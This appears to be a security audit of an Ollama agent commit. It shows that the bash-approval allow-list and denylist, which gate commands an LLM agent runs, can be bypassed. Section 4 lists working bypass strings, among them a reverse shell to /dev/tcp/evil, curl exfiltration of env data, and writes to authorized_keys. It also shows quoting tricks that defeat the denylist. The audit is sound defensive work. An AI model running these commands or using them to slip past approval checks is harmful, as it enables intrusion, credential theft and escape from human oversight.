# Bypass Analysis: 44179b7e (x/agent: use stdlib path package)

- **Cluster ID**: agent-bash-approval (with parent c8b599bd)
- **Type**: undisclosed-fix
- **File**: x/agent/approval.go
- **Verdict**: **bypassable** (the path-traversal hardening itself is mostly sound, but the surrounding allow-list design has multiple deeper bypasses that the patch does not address — and one new bypass arose specifically from the relaxed semantics of this commit)

## Patch Summary

`c8b599bd` added a custom `normalizePath()` helper, blocked any literal `..`, blocked any leading `/`, and rejected paths whose normalized form starts with `..`/`/`. Commit `44179b7e` reworks that to:

- replace the custom `normalizePath()` with stdlib `path.Clean`
- use `path.IsAbs()` instead of a `strings.HasPrefix(arg, "/")` check
- use `path.Dir()` for the directory part
- **relax** the previous behaviour: paths containing `..` are now allowed if `path.Clean()` keeps them under the same first component (so `tools/sub/../file.go` -> `tools/file.go` becomes an allowed prefix)
- detect "sibling escapes" by comparing `strings.SplitN(arg, "/", 2)[0]` to `strings.SplitN(cleaned, "/", 2)[0]`

The `extractBashPrefix` is the source of all approval/allow-list keys; nothing else compares paths. The eventual sink is `exec.CommandContext(ctx, "bash", "-c", command)` in `x/tools/bash.go`, i.e. the **whole user/LLM-provided string is shell-evaluated**.

## Hypotheses Tested

### 1. The narrow path-traversal mechanic itself

I rebuilt `extractBashPrefix` in /tmp/pathtest2.go and exercised it against every case the prompt called out. Results:

| Input arg | Verdict |
|---|---|
| `tools/a/b/../../../etc` | rejected (sibling-escape) |
| `tools/../etc/passwd` | rejected |
| `./tools/../../etc` | rejected (cleaned starts with `..`) |
| `tools/./../etc` | rejected (sibling-escape) |
| `tools//..//etc` | rejected (`path.Clean` collapses, sibling-escape) |
| `//etc/passwd` | rejected (`path.IsAbs` -> true) |
| `\etc\passwd` | the `\\`->`/` replacement happens before `path.IsAbs`, so it becomes `/etc/passwd` and is rejected |
| `TOOLS/../etc` | rejected (string compare is byte-exact, but TOOLS != etc anyway) |
| `tools/.../etc` | **passes** as if `...` were a literal directory name (no `..` inside, prefix becomes `cat:tools/.../`). Harmless because POSIX `...` is not a parent ref. |
| `tools/\u202E/../etc` | rejected (sibling-escape; Unicode is treated as opaque bytes) |

So **for the comparison itself the patch is sound** with respect to: Unicode normalization, trailing slash, empty components, absolute paths in any form, leading-dot, and case differential. `path.Clean` is purely lexical so symlink resolution does not happen here, but that is moot because the eventual sink is `bash -c <string>`, not an `os.Open` on `cleaned`.

### 2. New bypass introduced by relaxing the `..` rule (regression vs. c8b599bd)

`c8b599bd` rejected **any** `..` in the argument. `44179b7e` allows `..` when the cleaned path stays under the same first component. This re-enables a TOCTOU-style mismatch:

```
"cat tools/../tools/etc"  →  cleaned="tools/etc", prefix="cat:tools/" (allowed)
```

That is fine for `cat` but means the approval prefix is decided based on the **lexically cleaned** path, while bash will actually `open(2)` whatever `tools/../tools/etc` resolves to **at execution time** (different working dir, racing a `rename(2)`, or the leaf being a symlink). Combined with the `cat:tools/` -> `cat:tools/anything/` hierarchical rule, an attacker who can control the symlink target of any file under `tools/` can read arbitrary files via an approved `cat tools/X` style command. The patch did not address this because it deliberately switched from "lexical = filesystem" to "lexical only" semantics.

### 3. Multi-arg / second-argument bypass (alternate entry point in same function)

`extractBashPrefix` returns on the **first** path-like argument that passes its checks. Any subsequent arg is ignored by the approval logic but is still passed to `bash -c`:

```
ALLOWED  cat tools/file.go /etc/passwd
ALLOWED  cat tools/file.go ../../etc/passwd
ALLOWED  cat tools/file.go ~/.ssh/id_rsa     (denylist substring would catch THIS one,
                                              but only because ".ssh/id_rsa" is in denyPathPatterns)
```

This is a structural flaw in the allow-list, not in the path-cleaning code, and the patch under review does not change it.

### 4. Shell metacharacter bypass (the real story)

`extractBashPrefix` only splits on `|`. Everything else that bash treats as a command separator or substitution is invisible to it, so the FIRST `cat tools/X` token alone determines approval, and the rest of the bash string runs unsupervised:

```
ALLOWED  cat tools/file.go ; cat /etc/hosts
ALLOWED  cat tools/file.go && cat /var/log/auth.log
ALLOWED  cat tools/file.go || curl http://evil/$(id)
ALLOWED  cat tools/$(whoami)
ALLOWED  cat tools/`id`
ALLOWED  cat tools/{file.go,/etc/passwd}     (brace expansion happens in bash)
ALLOWED  cat tools/$PATH
ALLOWED  cat tools/*                         (glob)
ALLOWED  cat tools/file.go ; bash -i >& /dev/tcp/evil/4444 0>&1   (reverse shell)
ALLOWED  cat tools/file.go ; cat > ~/.ssh/authorized_keys <<< evil
ALLOWED  find tools/ -name x -exec rm -rf / {} +
ALLOWED  find tools/ -exec cat /etc/passwd \;
ALLOWED  cat tools/file.go > /etc/poison      (redirection writes outside tools/)
```

The `IsDenied` denylist catches some of these (`/etc/passwd`, `/etc/shadow`, `.ssh/id_rsa`, `rm -rf`, …) but is a substring filter that bash itself trivially defeats:

```
NOT DENIED  cat tools/file.go && cat /e''tc/passwd
NOT DENIED  cat tools/file.go && cat /et${PATH:0:0}c/passwd
NOT DENIED  cat tools/file.go && cat $'\x2fetc\x2fpasswd'
NOT DENIED  cat tools/file.go && cat $HOME/.ssh/id''_rsa
NOT DENIED  cat tools/file.go ; bash -i >& /dev/tcp/evil/4444 0>&1
NOT DENIED  cat tools/file.go ; printenv > /tmp/leak ; curl -F file=@/tmp/leak http://evil
NOT DENIED  cat tools/file.go ; cat > ~/.ssh/authorized_keys <<< $(echo evil)
```

Once one `cat tools/<anything>` is approved with "Allow for this session", any of the above will be allowed forever for the session.

### 5. Argument-skipping bypass

The first scan skips args that don't look path-like (`!contains("/") && !contains("\\") && !startsWith(".")`). The function silently drops to the second loop only when no path-like arg exists. But during the first scan, any earlier non-path token is skipped and the approval key is decided by the FIRST path-like token alone:

```
PREFIX cat:tools/   for   cat foo bar tools/file.go ../../etc
```

Combined with hierarchical match this means an attacker that can make the LLM pass an arbitrary additional arg gets free range.

### 6. `cat tools` (no slash) returns `cat:./`, NOT `cat:tools/`

```
cat tools     → prefix "cat:./"
cat tools/    → prefix "cat:tools/"
```

A user who approves `cat tools` (intending the directory) actually approves `cat <anything in cwd>`, because the first scan's path-like check requires `/` or leading `.`. This is the same class of inconsistency present pre-patch but worth flagging because the new comment line explicitly handles "explicit directory" via `isDir := strings.HasSuffix(arg, "/")` while leaving the no-slash branch to fall through to the second loop and emit `:./`.

### 7. Hierarchical match + `path.Dir` interaction

`matchesHierarchicalPrefix` is a raw `strings.HasPrefix` on the path component. This is fine when both sides end in `/` (which `extractBashPrefix` always emits). However, because every approved prefix is folded to its parent directory, approving `cat tools/sub/file.go` adds `cat:tools/sub/` and approving `cat tools/file.go` adds `cat:tools/`. So a user who only meant to authorize `tools/sub/` actually authorizes nothing broader, which is correct — but the converse means a single approval of `cat tools/anything` authorizes all of `tools/**` (including symlinked-out-of-tree leaves). Documented, but worth restating in the merged KB because users routinely under-estimate this scope.

### 8. Config-gated checks / default-state gaps

- `OLLAMA_AGENT_DISABLE_BASH=1` disables the bash tool entirely (defense). **Default is enabled.**
- `--yolo` / `opts.YoloMode` in `x/cmd/run.go:400` short-circuits ALL approval, so any of the above is an immediate full pwn under yolo mode.
- The `IsAutoAllowed` path is currently commented out (run.go:391-394), so there is no default auto-allow today — but the autoAllowPrefixes list contains `make`, `cmake`, `cargo build`, `npm test` etc. that all execute arbitrary code from project files. If re-enabled this becomes a major bypass because no path scoping is applied.

### 9. Compatibility / sibling code paths

The agent module has only one approval path (`x/agent/approval.go`); `x/cmd/run.go` is the sole caller. There is no second ApprovalManager and no other gate before `x/tools/bash.go` runs `bash -c`.

### 10. Windows / case-insensitive FS differential

`path.IsAbs("\etc\passwd")` is false (Go `path` is POSIX), but the `arg = strings.ReplaceAll(arg, "\\", "/")` normalization happens BEFORE the `path.IsAbs` check, so `\etc\passwd` becomes `/etc/passwd` and is correctly rejected. Case-insensitive comparison is not relevant: the comparison is byte-exact and the eventual `bash -c` execution does its own case-folding via the OS. On Windows specifically, `path.Clean` is fine but the executed command is still `bash -c ...`, which on Windows requires WSL/Cygwin and resolves paths case-insensitively against the Windows filesystem; the prefix `cat:Tools/` would not match a stored `cat:tools/` (byte-exact). This is a minor reliability issue, not a security one — but it means the allow-list does not protect against case-only renames in user paths.

## Verdict

**bypassable**. The patch correctly modernizes path normalization for the narrow case it was written for, and it survives Unicode/trailing-slash/empty-component/absolute-path/backslash variants. However:

1. The relaxation introduced by 44179b7e (allowing `..` if it stays under the same first component) opens a TOCTOU/symlink window that the prior commit closed.
2. The surrounding allow-list architecture remains trivially defeated by shell metacharacters, multi-arg commands, command substitution, brace/glob/parameter expansion, redirection, and `find -exec` — none of which are in scope of this patch but are the actual security boundary.
3. The denylist (`IsDenied`) is a case-folded substring match that is bypassed by trivial bash quoting (`'\x2fetc\x2fpasswd'`, `''` insertion, `${IFS}`).

## Evidence

- Patch under analysis: `git show 44179b7e`
- Parent: `git show c8b599bd`
- Sole caller of approval: `x/cmd/run.go:404`
- Sink: `x/tools/bash.go:64` (`exec.CommandContext(ctx, "bash", "-c", command)`)
- Approval logic: `x/agent/approval.go:200-300` (`extractBashPrefix`), `x/agent/approval.go:386-457` (`IsAllowed` + `matchesHierarchicalPrefix`)
- Denylist: `x/agent/approval.go:95-136` (denyPatterns + denyPathPatterns)
- Yolo bypass: `x/cmd/run.go:400`

## Recommendations (out of scope for this commit, surface to KB)

1. Tokenize commands with a real shell parser (e.g. `mvdan.cc/sh/v3/syntax`) and refuse anything containing `;`, `&&`, `||`, `$(`, backticks, redirection, glob, brace expansion, or process substitution before deriving an approval key.
2. Require the approved prefix to cover **every** path-like argument, not just the first.
3. Replace the substring-based denylist with an AST-based denial (or drop it — it gives false security).
4. Reconsider the `cat tools/X` -> `cat:tools/**` hierarchical promotion; require explicit approval at each subdirectory level.
5. Document that `OLLAMA_AGENT_DISABLE_BASH=1` is the only safe default for untrusted-model deployments.
